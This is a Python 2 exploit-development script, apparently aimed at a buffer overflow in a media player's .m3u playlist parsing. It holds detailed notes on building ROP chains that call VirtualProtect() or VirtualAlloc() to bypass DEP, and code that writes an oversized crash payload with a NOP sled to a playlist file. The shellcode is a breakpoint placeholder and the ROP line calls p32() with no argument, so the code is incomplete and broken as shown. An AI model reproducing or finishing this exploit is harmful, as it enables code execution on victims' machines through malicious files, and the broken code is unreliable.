# -*- coding: utf-8 -*-
import socket,struct

"""
#----------------------------------------#
# ROP Chain setup for VirtualProtect()   #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = lpOldProtect (ptr to W address)  #
# EDX = NewProtect (0x40)                #
# EBX = dwSize                           #
# ESP = lPAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        #
# ESI = ptr to VirtualProtect()          #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#

VirtualProtect()

http://msdn.microsoft.com/en-us/library/aa366898(VS.85).aspx

The VirtualProtect function changes the access protection of memory in the calling process.

#-----------------------------------------
# BOOL WINAPI VirtualProtect(            #
#   __in   LPVOID lpAddress,             #
#   __in   SIZE_T dwSize,                #
#   __in   DWORD flNewProtect,           #
#   __out  PDWORD lpflOldProtect         #
# );                                     #
#-----------------------------------------
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
If you want to use this function, you will have to put 5 parameters on the stack :
Return address 	pointer to the location where VirtualProtect() needs to return to. This will be the address of your shellcode on the stack (dynamically created value)
lpAddress 	pointer to the base address of the region of pages whose access protection attributes need to be changed. In essence, this will be the base address of your shellcode on the stack (dynamically created value)
dwsize 	number of bytes (dynamically created value, making sure the entire shellcode can get executed. If the shellcode will expand for some reason (because of decoding for example), then those additional bytes will need to be taken into account and accounted for.
flNewProtect 	option that specifies the new protection option : 0x00000040 : PAGE_EXECUTE_READWRITE. If your shellcode will not modify itself (decoder for example), then a value of 0x00000020 (PAGE_EXECUTE_READ) might work as well
lpflOldProtect 	pointer to variable that will receive the previous access protection value
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#

Note : The memory protection constants that can be used in VirtualProtect() can be found here

On XP SP3, VirtualProtect() is located at 0x7C801AD4 (kernel32.dll)
"""
#----------------------------------------#
# ROP Chain setup for VirtualAlloc()     #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = flProtect (0x40)                 #
# EDX = flAllocationType (0x1000)        #
# EBX = dwSize                           #
# ESP = lpAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        # 
# ESI = ptr to VirtualAlloc()            #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#

#VirtualAlloc()

#This function will allocate new memory. One of the parameters to this function specifies the execution/access level of the newly allocated memory, so the goal is to set that value to EXECUTE_READWRITE.

#http://msdn.microsoft.com/en-us/library/aa366887(VS.85).aspx

#-----------------------------------------
#LPVOID WINAPI VirtualAlloc(             #
#  __in_opt  LPVOID lpAddress,           #
#  __in      SIZE_T dwSize,              #
#  __in      DWORD flAllocationType,     #
#  __in      DWORD flProtect             #
# );                                     #
#-----------------------------------------
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
# This function requires you to set up a stack that contains the following values :
# Return Address 	Function return address (= address where function needs to return to after it has finished). I will talk about this value in a few moments
# lpAddress 	Starting address of region to allocate (= new location where you want to allocate memory). Keep in mind that this address might get rounded to the nearest multiple of the allocation granularity.� You can try to put a provide a hardcoded value for this parameter
# dwSize 	Size of the region in bytes. (you will most likely need to generate this value using rop, unless your exploit can deal with null bytes)
# flAllocationType 	Set to 0x1000 (MEM_COMMIT). Might need rop to generate & write this value to the stack
# flProtect 	Set to 0x40 (EXECUTE_READWRITE). Might need rop to generate & write this value to the stack
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#

def p32(x):
    return struct.pack("I",x)

shellcode = "\xCC" * 400

rop =  p32() 

crash = "http://."
crash += "A"*17416
crash += rop
crash += "\x90" * 200
final_crash = "C"*(7572-len(rop)-200)

try:
    path = "crash.m3u"
    open(path,"wb").write(crash+final_crash)
    print "Payload was written at: {}!".format(path)
except Exception as e:
    print "[-] {}".format(e)

